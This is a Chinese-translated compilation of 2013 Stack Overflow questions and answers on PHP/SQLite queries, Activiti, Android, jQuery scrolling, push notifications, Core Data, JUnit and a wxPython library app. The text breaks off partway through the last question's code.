> 时间：2013-03-07T03:59:25.187
> 
> 标签：php, html, sql, sqlite

我正在尝试获取 SQLite 数据库中图像的路径。这是我的代码：

```
<img src="<?php
    $database = new PDO("sqlite:database.sqlite");
    $database->query("SELECT path FROM images WHERE receiverId = '$_COOKIE['session']'");
?>" /> 
```

该表是图像，用户的 id 存储在 cookie 中。

一个图像有 3 个条目`id`：`senderId`和`receiverId`。如果 与`receiverId`cookie id（用户 id）相同，则应显示图像。但是，此代码不起作用。我该如何修复它/重新编码它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T04:18:38.000

您需要获取查询的结果：

```
<?php

  $database = new PDO('sqlite:database.sqlite');
  $r = $database->query('SELECT path FROM images WHERE receiverId = ' . $database->quote($_COOKIE["session"]));
  $v = $r->fetch(PDO::FETCH_ASSOC);

?>
<img src='<?= $v["path"] ?>'> 
```

* * *

为了更容易找到您的问题，添加一些调试语句：

```
// ... create $database
$database->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// ... run the query (creating $r)
var_dump($r);

// ... fetch the results
var_dump($v); 
```

# activiti - Activiti多实例不分配用户

> ID：15262805
> 
> 赞同：0
> 
> 时间：2013-03-07T03:59:27.283
> 
> 标签：activiti

我正在尝试设置多实例子进程，它创建了正确数量的进程，但没有分配给任何进程。

我使用一项 java 服务任务来获取所有用户

```
public class ListUsers implements JavaDelegate {

@Override
public void execute(DelegateExecution execution) throws Exception {
    String group = (String) execution.getVariable("group");
    List<User> lista = execution.getEngineServices().getIdentityService().createUserQuery().memberOfGroup(group).list();
    List<String> usuarios  = new ArrayList<>();
    for (User user : lista) {
        usuarios.add(user.getId());
    }
    execution.setVariable("listaUsuarios", usuarios);
    execution.setVariable("listaUsuariosSize", usuarios.size());
}

} 
```

我的多实例定义

```
<subProcess id="subprocessConfirmacaoPresencaReuniao" name="Confirmação de Presença na Reuniao">
  <multiInstanceLoopCharacteristics isSequential="false">
    <loopDataInputRef>listaUsuarios</loopDataInputRef>
    <inputDataItem name="assignee" />
  </multiInstanceLoopCharacteristics>
  <startEvent id="starteventConfirmacaoPresencaReuniao" name="Start"></startEvent>
  <userTask id="confirmarPresenca" name="Confirmar Presença"></userTask>
</subProcess> 
```

我在组中有 4 个用户，它正确启动了 4 个进程，但没有分配给用户。

```
Variables

NAME VALUE
group consuni
listaUsuarios [admin, cleo, fozzie, kermit]
listaUsuariosSize 4 
```

有什么我做错了吗？我正在使用 Activiti 5.11。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T19:19:36.607

您应该使用元素`activiti:assignee="${assignee}"`的属性      显式设置受让人。`userTask`顺便说一句，如果您仅将子流程用于多实例活动，最好`<multiInstanceLoopCharacteristics>`进入`<userTask>`并删除子流程元素
     [Activiti 用户指南：多实例](http://www.activiti.org/userguide/index.html#bpmnMultiInstance)

# android - 这个 android 虚拟设备有什么问题

> ID：15262807
> 
> 赞同：0
> 
> 时间：2013-03-07T03:59:35.887
> 
> 标签：android, emulation

我在 Eclipse 上定义了几个 AVD，它们工作正常。

我刚刚添加了 Galaxy Nexus (4.65" 720x1280) 并使用默认设置 RAM-1024 VMheap 64 Internal 200MB ，没有 SD 卡。

我收到启动错误

```
[2013-03-07 10:57:17 - Emulator] Failed to allocate memory: 8
[2013-03-07 10:57:17 - Emulator] 
[2013-03-07 10:57:17 - Emulator] This application has requested the Runtime to terminate it in an unusual way. 
```

我试过玩内存大小等但没有任何帮助

我在 4GB 内存的 win7 上运行

我的电脑屏幕分辨率是 1920x1200

有什么想法吗？

谢谢史蒂夫

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T06:02:44.587

please delete all other avd and try your galaxy nexus avd. I think if we create so many avd we got this type of memory issue. and also decrease the ram size.

# javascript - 滚动到它时获取元素ID

> ID：15262809
> 
> 赞同：0
> 
> 时间：2013-03-07T03:59:41.187
> 
> 标签：javascript, jquery, scroll, element

我有一个在线阅读漫画的网站。

阅读页面的HTML是：

```
<div id="listimages">
<img src="abc1.jpg" id="image1" />
<img src="abc2.jpg" id="image2" />
<img src="abc3.jpg" id="image3" />
<img src="abc4.jpg" id="image4" />
</div> 
```

我想获取滚动到的图像的 id。例如，当我查看 img abc2.jpg 时，我想获取它的元素 id 是 #image2。

```
idnow = idnow_getted 
```

请帮助我，谢谢大家！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T04:12:35.667

您可以比较窗口的滚动顶部和图像的顶部位置，以获取滚动到的图像的 id。

例如，

```
$(window).scroll(function() {

var winTop = $(this).scrollTop();
var $imgs = $('img');

$.each($imgs, function(item) {
    if($(item).position().top <= winTop)
         //get id here

});
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T04:41:11.587

可能有两种情况，您需要图像的 id 并进行进一步处理，

**第一种情况**您想在窗口滚动时执行某些操作。在这种情况下，只需在滚动事件上添加一个处理程序。

```
$(window).scroll(function() {

    var windowTop = $(this).scrollTop(),
        image = $('#listimages').find('img').filter(function(){
            return $(this).offset().top < windowTop+100;
           //i am adding 100 in windowTop as we can consider the the image as cuurent image even if it is little bit below than top of window.
        });

            //now you can directly use image if you want to manipulate it.
            //if you want id you can get it by
          var id=image[0].id //or image.attr('id'); 

    }); 
```

**第二种情况**，如果您想在触发任何事件时执行一些操作。

```
function currentImg(){
            var windowTop = $(this).scrollTop(),
            image = $('#listimages').find('img').filter(function(){
                return $(this).offset().top < windowTop+100;
             });
           return image[0].id;

} 
```

但是请记住添加事件，例如滚动，鼠标移动会更频繁地执行，因此建议不要使用太多，直到您需要它。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2013-03-07T04:30:47.140

***只需尝试以下方法，***

**JavaScript 和 jQuery 部分：**

```
<script src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
<script type="text/javascript">
$(document).ready(function () {
$('#listimages img').mouseover(function() {
   alert(this.id);
});
});
</script> 
```

**HTML部分：**

```
<div id="listimages">
<img src="abc1.jpg" id="image1" />
<img src="abc2.jpg" id="image2" />
<img src="abc3.jpg" id="image3" />
<img src="abc4.jpg" id="image4" />
</div> 
```

我认为这可以帮助您解决问题。

# ios - WhatApp 等应用程序如何摆脱 Apple 推送通知服务的连接限制？

> ID：15262813
> 
> 赞同：0
> 
> 时间：2013-03-07T04:00:04.500
> 
> 标签：ios, scalability, apple-push-notifications

Apple APNS 最多只允许`20`来自您的服务器的最大连接，那么像 WhatApp 这样的应用程序如何能够每秒传递如此大量的消息呢？

即使他们可以使用多台服务器，但假设他们有 500 万活跃用户发送消息，他们还需要 25 万台服务器，这听起来很疯狂，对吧？

这里的诀窍是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T04:35:54.917

这很简单：您不需要每个用户一个连接。

您可以为每个 APNS 连接发送多条消息。每条消息都可以发送到不同的设备。最大有效载荷长度为 256 字节加上 45 字节的开销；一个 10Mbit 的连接每秒可以处理*至少*4100 条消息，或者大约 250k/分钟，或者每个用户每小时大约 3 条消息。

平均“活跃用户”每小时发送超过 3 个吗？很难说。“活跃”可能意味着他们在当月发送了一条消息；这种分布有*很长的*尾巴。

无论哪种方式，这都是针对*单个*10M 连接的。我不确定苹果方面有多少争论，但如果你能在没有太多大惊小怪的情况下超过 50M，我也不会感到惊讶。

此外，当应用程序处于前台时，他们几乎肯定会使用自己的服务器，如果他们很聪明，他们可以在应用程序后台运行后保持连接打开几分钟（并且仅在连接关闭后使用推送通知）。

# php - 带有自定义 CSS 的 Facebook 粉丝盒

> ID：15262814
> 
> 赞同：1
> 
> 时间：2013-03-07T04:00:05.837
> 
> 标签：php, facebook

我有一个运行以下代码的网站：

```
<iframe class="fanbox" width="472" height="220" src="http://www.connect.facebook.com/widgets/fan.php?href=<?php echo urlencode('http://www.facebook.com/my-website-page'); ?>&amp;width=472&amp;colorscheme=light&amp;show_faces=true&amp;stream=false&amp;header=false&amp;height=220&amp;css=<?php echo urlencode('http://mywebsite.com/css/fb-style.css'); ?>"></iframe> 
```

它正在工作，但似乎 facebook 删除了这种获取 Fan Box 的方法。现在我收到 404 Not Found 错误： http: [//www.connect.facebook.com/widgets/fan.php](http://www.connect.facebook.com/widgets/fan.php)

它真的被删除/移动了吗？我现在该怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T16:49:39.877

[你应该在这里](https://developers.facebook.com/docs/reference/plugins/like-box/)使用Like Box 。如果您只想要“粉丝”图像，请取消选中“流”等，直到您获得所需的内容。然后单击“获取代码”并在对话框中选择“IFrame”。

在您的示例中，它将是：

```
<iframe src="//www.facebook.com/plugins/likebox.php?href=<?php echo urlencode('YOUR_FB_URL'); ?>&amp;width=292&amp;height=258&amp;show_faces=true&amp;colorscheme=light&amp;stream=false&amp;border_color&amp;header=false&amp" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:292px; height:258px;" allowTransparency="true"></iframe> 
```

# javascript - 根据 URL 输入动态更改文本

> ID：15262815
> 
> 赞同：1
> 
> 时间：2013-03-07T04:00:13.260
> 
> 标签：javascript, jquery, url, parameters

我正在使用以下代码来动态更改我的客户网站 (www.mydomain.com.au) 上的文本：

```
<script type="text/javascript">// <![CDATA[
       var url = window.location.toString();
       var query_string = url.split("?");
               if (query_string[1]) {
       var params = query_string[1].split("&#038;");
       var param_item = params[0].split("=");
       param_item[param_item[0]] = unescape(param_item[1]);
       document.write(param_item["city"]);
               } else {
                       document.write("24 Hour Glass Replacement");
               }
// ]]&gt;</script> 
```

它在索引页面上工作得很好。例如[www.mydomain.com.au/?city=test](http://www.mydomain.com.au/?city=test)

但是当我在其他页面上使用相同的代码时，例如[http://www.mydomain.com.au/Brisbane.html/?city=test](http://www.mydomain.com.au/Brisbane.html/?city=test)我收到 404 错误。

感谢任何帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T04:08:45.210

在开始查询字符串之前删除 /。所以，试试[http://www.mydomain.com.au/Brisbane.html?city=test](http://www.mydomain.com.au/Brisbane.html?city=test)而不是 [http://www.mydomain.com.au/Brisbane.html/?city=test](http://www.mydomain.com.au/Brisbane.html/?city=test)

# android - 向 EditText 插入数据

> ID：15262817
> 
> 赞同：0
> 
> 时间：2013-03-07T04:00:18.963
> 
> 标签：android, button, android-edittext

我正在制作一个简单的应用程序，它有两个按钮和一个编辑文本。单击按钮时，edittext 将显示我的数据库的值。我试过这段代码，但没有用

```
 public void onClick(View v) {
    // TODO Auto-generated method stub

    if (v == bnt1) {
    SharedPreferences sharename = PreferenceManager.getDefaultSharedPreferences(this);
    String na = sharename.getString("thename", "null");

    edit.setText(na);

    } else if (v == bnt2) {

    SharedPreferences sharedescribed = PreferenceManager.getDefaultSharedPreferences(this);
    String dess = sharedescribed.getString("thedescribed", "null");

    edit.setText(dess);

}
} 
```

请告诉我问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T04:13:38.093

使用以下代码：

```
btn1.setOnClickListener(new OnClickListener() {         
            @Override
            public void onClick(View v) {
  SharedPreferences sharename = PreferenceManager.getDefaultSharedPreferences(this);
    String na = sharename.getString("thename", "null");
    edit.setText(na);
        }
}

btn2.setOnClickListener(new OnClickListener() {         
            @Override
            public void onClick(View v) {
  SharedPreferences sharedescribed = PreferenceManager.getDefaultSharedPreferences(this);
    String dess = sharedescribed.getString("thedescribed", "null");

    edit.setText(dess);
        }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T04:14:38.520

试试这个代码：

```
 SharedPreferences sharename = this.getSharedPreferences("sharename", MODE_WORLD_READABLE);
    String prefName = sharename.getString("thename", 0);
    edit.setText(prefName); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T04:19:45.390

我猜异常是 NullPointerException。请在调用 getString() 方法之前检查您的共享偏好是否为空。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-07T04:25:50.107

看起来您可能没有`Button`附加到您的`onClick()`方法，这会导致`null pointer exception`当您尝试`v`在方法内部引用时。有不同的实现方式（以编程方式或通过 xml）。使用您显示的内容（不覆盖该`onClick()`方法），您似乎想要使用 xml 方式，这意味着您需要为您的`Buttons`

```
<Button
    android:id="@+id/btn1"
    android:onClick="onClick" 
```

然后对 btn2 做同样的事情。然后`v`将引用`Button`被点击的那个。您也可以通过编程方式执行此操作，但设置一个`onClickListener`

```
 Button btn1 = (Button) findViewById(R.id.btn1);
btn1.setOnClickListener(new OnClickListener() {         
    @Override
    public void onClick(View v)
    {
      // some code
    }
}); 
```

但是你必须做同样的事情，`btn2`所以如果你想为两个`Button`s 重用相同的函数，那么第一种方法将是首选。

[这是我之前回答相同问题的链接](https://stackoverflow.com/questions/14966838/how-to-return-to-previous-activity-from-about-with-a-button-click/14967290#14967290)

# ios - 服务器端 json 应用程序中的核心数据要求

> ID：15262819
> 
> 赞同：2
> 
> 时间：2013-03-07T04:00:21.343
> 
> 标签：ios

我正在尝试为我的网站构建一个应用程序。我的印象是，我所要做的就是从服务器获取 json 并将其放入我的手机。但是今天我遇到了 Core Data（我是 iOS 新手）。

所以我的问题是，为了制作一个更快的 iOS 应用程序，获取 json 数据并将其保存为核心数据是一种正常的做法吗？Facebook、Twitter 等应用程序会采用这种方法吗？或者只是获取和解析json是正常的做法，不需要核心数据。

如果问题很愚蠢，我很抱歉。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T04:26:29.573

**如果**内存占用合理，从服务器（XML 或 JSON）检索数据并将其保存在内存中是正常的。如果您正在谈论来自数据库的数十万行，那么具有专用数据模型的持久存储可能是最佳选择；您可以在需要时阅读它。

如果您需要复杂的数据模型、一对多和/或多对多关系，那么请考虑 Core Data（或直接使用 SQLite）。

您首先定义您的需求，然后尝试定义适合您需求的数据模型（自定义对象或可能只是一些实例`NSDictionary`），然后决定该数据需要如何持久化以及您计划如何与该数据交互。

几个起点：

*   [核心数据概述](http://developer.apple.com/library/mac/#documentation/cocoa/Conceptual/CoreData/cdProgrammingGuide.html)- 应该帮助您决定是否应该使用它
*   [RestKit](http://restkit.org/) - 只是一个建议
*   [数据持久性教程](http://mobile.tutsplus.com/tutorials/iphone/iphone-sdk_store-data/)

祝你好运。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T04:19:12.427

我记得不久前遇到过这个异常。

正如一些评论中已经指出的那样，**这取决于您的需求**。

从 Web 端检索数据后，并非所有数据都有资格保存在核心数据中。您可能对此有完整性问题。对大块数据进行检查可能会产生严重的开销。但是，如果您觉得某些数据不太可能经常更改，那么您可以在某些部分使用这种技术。

如果您决定坚持使用 Request/Fetch 数据，请确保使用[NSOperation](http://developer.apple.com/library/mac/#documentation/Cocoa/Reference/NSOperation_class/Reference/Reference.html)、[GCD](https://developer.apple.com/library/mac/#documentation/Performance/Reference/GCD_libdispatch_Ref/Reference/reference.html)或[NSThread](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSThread_Class/Reference/Reference.html)处理请求，以避免 UI 冻结。

尽管它们用于相同的目的，但它们都有优点和缺点，请查看[NSOperation vs Grand Central Dispatch 上的这个主题](https://stackoverflow.com/questions/10373331/nsoperation-vs-grand-central-dispatch)

我希望这有帮助。

# java - 运行junit test一定时间

> ID：15262820
> 
> 赞同：3
> 
> 时间：2013-03-07T04:00:21.943
> 
> 标签：java, testing, junit

我想测试一段时间，比如 5 秒，然后如果没有断言错误，则通过测试。这可以通过注释来实现吗？可以使用类似的东西`@Test(uptime=5000)`吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-07T04:02:12.813

**编辑问题后的修订答案**

从根本上说，感觉就像你在这里测试了错误的东西——“什么都没发生”成为成功的标志似乎很奇怪。

如果你想证明你的算法可以运行一段时间而不会失败，我实际上会提取一个循环，然后编写一个类似的测试：

```
@Test
public void fineForFiveSeconds() {
    long start = System.nanoTime();
    long end = start + TimeUnit.SECONDS.toNanos(5);
    while (System.nanoTime < end()) {
        test.executeOneIteration();
    }
} 
```

这样你就没有一个单独的线程来杀死*工作*代码等。

**原始答案**

这个答案是*在*问题表明超时是成功而不是失败的标志之前写的。

我认为您只需要注释[`timeout`](http://junit.sourceforge.net/javadoc/org/junit/Test.html#timeout%28%29)中的属性：`@Test`

```
@Test(timeout = 5000) 
```

与文档：

> 可选地以毫秒为单位指定超时，以在测试方法花费的时间超过该毫秒数时导致失败。

# python - 当我使用 wxPython 访问我的函数时 Python 崩溃

> ID：15262825
> 
> 赞同：0
> 
> 时间：2013-03-07T04:00:53.570
> 
> 标签：python, sqlite, wxpython, python-2.6

所以，我有两段代码。首先是GUI类：

```
'''
Created on Mar 6, 2013

@author: Zach
'''
# -*- coding: utf-8 -*- 

###########################################################################
## Python code generated with wxFormBuilder (version Sep  8 2010)
## http://www.wxformbuilder.org/
##
## PLEASE DO "NOT" EDIT THIS FILE!
###########################################################################

import wx
import wx.grid
from Books import *
###########################################################################
## Class MyFrame1
###########################################################################

class MyFrame1 ( wx.Frame ):

    def __init__( self, parent ):
        wx.Frame.__init__ ( self, parent, id = wx.ID_ANY, title = wx.EmptyString, pos = wx.DefaultPosition, size = wx.Size( 734,344 ), style = wx.DEFAULT_FRAME_STYLE|wx.TAB_TRAVERSAL )

        self.SetSizeHintsSz( wx.DefaultSize, wx.DefaultSize )

        bSizer1 = wx.BoxSizer( wx.VERTICAL )

        bSizer2 = wx.BoxSizer( wx.HORIZONTAL )

        self.patrons_table = wx.grid.Grid( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, 0 )

        # Grid
        self.patrons_table.CreateGrid( 0, 7 )
        self.patrons_table.EnableEditing( True )
        self.patrons_table.EnableGridLines( True )
        self.patrons_table.SetGridLineColour( wx.SystemSettings.GetColour( wx.SYS_COLOUR_APPWORKSPACE ) )
        self.patrons_table.EnableDragGridSize( True )
        self.patrons_table.SetMargins( 0, 0 )

        # Columns
        self.patrons_table.SetColSize( 0, 100 )
        self.patrons_table.SetColSize( 1, 100 )
        self.patrons_table.SetColSize( 2, 100 )
        self.patrons_table.SetColSize( 3, 100 )
        self.patrons_table.SetColSize( 4, 100 )
        self.patrons_table.SetColSize( 5, 100 )
        self.patrons_table.SetColSize( 6, 100 )
        self.patrons_table.EnableDragColMove( True )
        self.patrons_table.EnableDragColSize( True )
        self.patrons_table.SetColLabelSize( 40 )
        self.patrons_table.SetColLabelValue( 0, "ID" )
        self.patrons_table.SetColLabelValue( 1, "Name" )
        self.patrons_table.SetColLabelValue( 2, "Address" )
        self.patrons_table.SetColLabelValue( 3, "Phone" )
        self.patrons_table.SetColLabelValue( 4, "Email" )
        self.patrons_table.SetColLabelValue( 5, "Fees/Day")
        self.patrons_table.SetColLabelValue( 6, "Fees Owed" )

        self.patrons_table.SetColLabelAlignment( wx.ALIGN_CENTRE, wx.ALIGN_CENTRE )

        # Rows
        self.patrons_table.AutoSizeRows()
        self.patrons_table.EnableDragRowSize( True )
        self.patrons_table.SetRowLabelSize( 80 )
        self.patrons_table.SetRowLabelAlignment( wx.ALIGN_CENTRE, wx.ALIGN_CENTRE )

        # Label Appearance

        # Cell Defaults
        self.patrons_table.SetDefaultCellAlignment( wx.ALIGN_LEFT, wx.ALIGN_TOP )
        self.patrons_table.SetToolTipString( u"Table of patrons in the library" )

        bSizer2.Add( self.patrons_table, 7, wx.EXPAND|wx.ALL|wx.ALIGN_BOTTOM, 5 )

        bSizer6 = wx.BoxSizer( wx.VERTICAL )

        self.m_panel1 = wx.Panel( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
        bSizer6.Add( self.m_panel1, 1, wx.EXPAND |wx.ALL, 5 )

        self.m_button1 = wx.Button( self, wx.ID_ANY, u"Add", wx.DefaultPosition, wx.DefaultSize, 0 )
        self.m_button1.SetToolTipString( u"Adds a patron" )

        bSizer6.Add( self.m_button1, 0, wx.ALL, 5 )

        self.m_button2 = wx.Button( self, wx.ID_ANY, u"Remove", wx.DefaultPosition, wx.DefaultSize, 0 )
        self.m_button2.SetToolTipString( u"Removes the selected patron" )

        bSizer6.Add( self.m_button2, 0, wx.ALL, 5 )

        self.m_button3 = wx.Button( self, wx.ID_ANY, u"Update", wx.DefaultPosition, wx.DefaultSize, 0 )
        self.m_button3.SetToolTipString( u"Updates the database" )

        bSizer6.Add( self.m_button3, 0, wx.ALL, 5 )

        bSizer2.Add( bSizer6, 1, wx.EXPAND, 5 )

        bSizer1.Add( bSizer2, 1, wx.EXPAND, 5 )

        bSizer5 = wx.BoxSizer( wx.HORIZONTAL )

        self.m_searchCtrl2 = wx.SearchCtrl( self, wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.Size( 715,-1 ), 0 )
        self.m_searchCtrl2.ShowSearchButton( True )
        self.m_searchCtrl2.ShowCancelButton( False )
        bSizer5.Add( self.m_searchCtrl2, 0, wx.ALL|wx.EXPAND, 5 )

        bSizer1.Add( bSizer5, 0, wx.EXPAND, 5 )

        self.SetSizer( bSizer1 )
        self.Layout()

        self.Centre( wx.BOTH )

        # Connect Events
        self.patrons_table.Bind( wx.grid.EVT_GRID_CELL_CHANGE, self.onGridChange )
        self.patrons_table.Bind( wx.grid.EVT_GRID_SELECT_CELL, self.onLeftClick )
        self.m_button1.Bind( wx.EVT_BUTTON, self.addpatron )
        self.m_button2.Bind( wx.EVT_BUTTON, self.removepatron )
        self.m_button3.Bind( wx.EVT_BUTTON, self.updatepatronsDatabase )
        self.m_searchCtrl2.Bind( wx.EVT_SEARCHCTRL_SEARCH_BTN, self.searchpatrons )
        self.m_searchCtrl2.Bind( wx.EVT_TEXT_ENTER, self.searchpatrons )

        #Import the Database into the table
        self.lib = Library()
        self.db = Database()
        for i in self.db.getPatrons():
            print "hello"
            self.lib.addPatron(Patron(i[0], i[1], i[2], i[3], i[4]))
        self.lib.resetHistory()

        for i in self.lib.patrons:
            self.patrons_table.InsertRows()
            self.patrons_table.SetCellValue(0,0,str(i["title"]))
            self.patrons_table.SetCellValue(0,1,str(i["author"]))
            self.patrons_table.SetCellValue(0,2,str(i["patron_id"]))
            self.patrons_table.SetCellValue(0,3,str(i["location"]))
            self.patrons_table.SetCellValue(0,4,str(i["publisher"]))
            self.patrons_table.SetCellValue(0,5,str(i["genre"]))
            self.patrons_table.SetCellValue(0,6,str(i["copy_right"]))
            self.patrons_table.SetCellValue(0,7,str(i["subject"]))
            self.patrons_table.SetCellValue(0,8,str(i["is_checked_out"]))
    def __del__( self ):
        pass

    # Virtual event handlers, overide them in your derived class

#EVENTS
    def onGridChange( self, event ):# Called if one of the cell values was changed
        updated_patron = Patron(self.patrons_table.GetCellValue(self.patrons_table.GetGridCursorRow(),0),
                             self.patrons_table.GetCellValue(self.patrons_table.GetGridCursorRow(),1),
                             self.patrons_table.GetCellValue(self.patrons_table.GetGridCursorRow(),2),
                             self.patrons_table.GetCellValue(self.patrons_table.GetGridCursorRow(),3),
                             self.patrons_table.GetCellValue(self.patrons_table.GetGridCursorRow(),4),
                             self.patrons_table.GetCellValue(self.patrons_table.GetGridCursorRow(),5),
                             self.patrons_table.GetCellValue(self.patrons_table.GetGridCursorRow(),6),
                             self.patrons_table.GetCellValue(self.patrons_table.GetGridCursorRow(),7),
                             self.patrons_table.GetCellValue(self.patrons_table.GetGridCursorRow(),8),
                             self.patrons_table.GetCellValue(self.patrons_table.GetGridCursorRow(),9),
                             self.patrons_table.GetCellValue(self.patrons_table.GetGridCursorRow(),10))
        self.lib.editPatron(self.selected_patron, updated_patron)
    def onLeftClick( self, event ): #Turns the selected row into a patron
        self.selected_patron = Patron(self.patrons_table.GetCellValue(self.patrons_table.GetGridCursorRow(),0),
                             self.patrons_table.GetCellValue(self.patrons_table.GetGridCursorRow(),1),
                             self.patrons_table.GetCellValue(self.patrons_table.GetGridCursorRow(),2),
                             self.patrons_table.GetCellValue(self.patrons_table.GetGridCursorRow(),3),
                             self.patrons_table.GetCellValue(self.patrons_table.GetGridCursorRow(),4),
                             self.patrons_table.GetCellValue(self.patrons_table.GetGridCursorRow(),5),
                             self.patrons_table.GetCellValue(self.patrons_table.GetGridCursorRow(),6),
                             self.patrons_table.GetCellValue(self.patrons_table.GetGridCursorRow(),7),
                             self.patrons_table.GetCellValue(self.patrons_table.GetGridCursorRow(),8),
                             self.patrons_table.GetCellValue(self.patrons_table.GetGridCursorRow(),9),
                             self.patrons_table.GetCellValue(self.patrons_table.GetGridCursorRow(),10))
        self.row = self.patrons_table.GetGridCursorRow()
        self.column = self.patrons_table.GetGridCursorCol()
        event.Skip()
    def addpatron( self, event ):# adds a patron to the library and the table
        self.patrons_table.InsertRows()
        self.lib.addpatron(Patron())
        event.Skip()
    def removepatron( self, event ): #removes a patron from the table and the library
        self.lib.removepatron(self.selected_patron)
        self.patrons_table.DeleteRows()
        print self.lib.patrons
        event.Skip()
    def updatepatronsDatabase( self, event ): #syncs the database with the library
        self.db.mergeWithLibrary(self.lib)

    def searchpatrons( self, event ):
        value =  self.m_searchCtrl2.GetValue()
        i=0
        while self.patrons_table.GetNumberRows()-1 >i:
            if self.patrons_table.GetCellValue(i,2) == value:
                self.patrons_table.SetGridCursor(i,2)
                self.patrons_table.SelectRow(i)
                self.patrons_table.Scroll(i,i)
                break
            i = i+1
if __name__ == '__main__':
    app = wx.PySimpleApp()
    frame = MyFrame1(None)
    frame.Show()
    frame.Maximize()
    app.MainLoop() 
```

而代码的第二部分是GUI类背后的引擎：

```
'''
Created on Mar 2, 2013

@author: Braden

This is a test file to try to make the GUI easier to program
It worked!
'''

import sqlite3 as sq
class Book(object):
    r"""
    This class defines what a book is. All books in the library are book objects
    """
    def __init__(self, title = "n", author = "n", book_id = "n", location = "n", publisher = "n", genre = "n", copy_right = "n", subject = "n", is_checked_out = "n", price = "n", fee_increment = "n"):
        r"""
        This function sets the basic attributes of each book
        """
        self.attributes = {"title":title,
                          "author":author,
                          "book_id":book_id,
                          "location":location,
                          "publisher":publisher,
                          "genre":genre,
                          "copy_right":copy_right,
                          "subject": subject,
                          "is_checked_out":is_checked_out,
                          "price": price,
                          "fee_increment":fee_increment
                          }
    def __str__(self):
        r"""
        This returns a string representation of the book. This is what makes " print book" possible.
        """
        return str(self.attributes)
    def __getitem__(self,key):
        r"""
        This returns an attribute in the book. It makes "book['title']" work.
        """
        return self.attributes[key]
    def __setitem__(self,key,value):
        r"""
        This sets an attribute to a different value. It makes "book['title'] = 'My New Title' " Possilble ...I think.
        """
        self.attributes[key] = value
    def __cmp__(self,book):
        if self.attributes == book.attributes:
            return True
        else:
            return False      
class Patron(object):
    r"""
    This is the Patron class. It is almost identical to the Book class just with different attributes.
    """
    def __init__(self, patron_id, name, address, phone, email):
        self.attributes = { "patron_id" : patron_id,
                       "name" : name,
                       "address" : address,
                       "phone" : phone,
                       "email" : email,
                       "fee_balance" : 0.00,
                       "fees_per_day" : 0.00,
                       "books_checked_out" : "",
                       "books_overdue" : ""}
    def __str__(self):
        return str(self.attributes)
    def __getitem__(self,key):
        return self.attributes[key]
    def __setitem__(self,key,value):
        self.attributes[key] = value
class Library(object):
    r"""
    This is the Library Class. It manipulates a database that has been loaded into the RAM. 
    """
    def __init__(self):
        r"""
        All this does is set the default values for the two Loaded Databases and the history.
        """
        self.books = []
        self.patrons= []
        self.history = []
    def addBook(self,book):
        r"""
        This appends a book object to the self.books list. Then it appends the action to the self.history list.
        """
        self.books.append(book)
        self.history.append(("book","add",book))     
    def removeBook(self, Book):
        r"""
        This removes a book object from the self.books list. Then it appends the action to the self.history list
        """
        self.books.remove(Book)
        self.history.append(("book","remove",Book))  
    def editBook(self, old_book, new_book):
        original_id = old_book["book_id"]
        r"""
        This edits a book object in the self.books list. Then it appends the action to the self.history list.
        """
        old_book["title"] = new_book["title"]
        old_book["author"] = new_book["author"]
        old_book["book_id"] = new_book["book_id"]
        old_book["location"] = new_book["location"]
        old_book["publisher"] = new_book["publisher"]
        old_book["genre"] = new_book["genre"]
        old_book["copy_right"] = new_book["copy_right"]
        old_book["subject"] = new_book["subject"]
        old_book["is_checked_out"] = new_book["is_checked_out"]
        old_book["price"] = new_book["price"]
        old_book["fee_increment"] = new_book["fee_increment"]
        self.history.append(("book","edit",old_book,original_id))    
    def addPatron(self, patron):
        r"""
        This appends a new Patron object to the self.patrons list. It then appends the action to the self.history list.
        """
        self.patrons.append(patron)
        self.history.append(("patron","add",patron))
        print "bonjour"
        print self.patrons[0]
    def removePatron(self,patron):
        r"""
        This Removes a patron object from the self.patrons list. It then appends the actino to the self.history list.
        """
        self.patrons.remove(patron)
        self.history.append(("patron","remove",patron)) 
    def editPatron(self,patron,attribute,value):
        r"""
        This edits a patron object in the self.patrons list. It then appends the action to the self.history list.
        """
        patron[attribute] = value
        self.history.append(("patron","edit",patron))
    def resetHistory(self):
        r"""
        This resets the self.history list
        """
        self.history=[]
    def getBook(self,book_id):
        r"""
        This finds a book based on its id
        """
        for i in self.books:
            if i["book_id"] == str(book_id):
                return i

    def __str__(self):

        for i in self.books:
            print i
        for i in self.patrons:
            print i         
        return "done"
class Database():
    r"""
    This is the Database Class. It modifies the library.db file.
    """
    def __init__ (self):
        r"""
        This presets the self.database variable and the self.cursor variable
        """
        self.database = sq.connect('library.db')
        self.cursor = self.database.cursor()
    def mergeWithLibrary(self,library):
        r"""
        This is my personal favorite. It updates the library.db file based off of the changes the Library object.

        """
        for i in library.history:
            print i
            if i[0] == "book":
                if i[1] == "add":
                    self.addBook(i[2])
                elif i[1] == "remove":
                    self.deleteBook(i[2])
                elif i[1] == "edit":
                    self.editBook(i[2],i[3])
            elif i[0] == "patron":
                if i[1] == "add":
                    self.addPatron(i[2])
                elif i[1] == "remove":
                    self.deletePatron(i[2])
                elif i[2] == "edit":
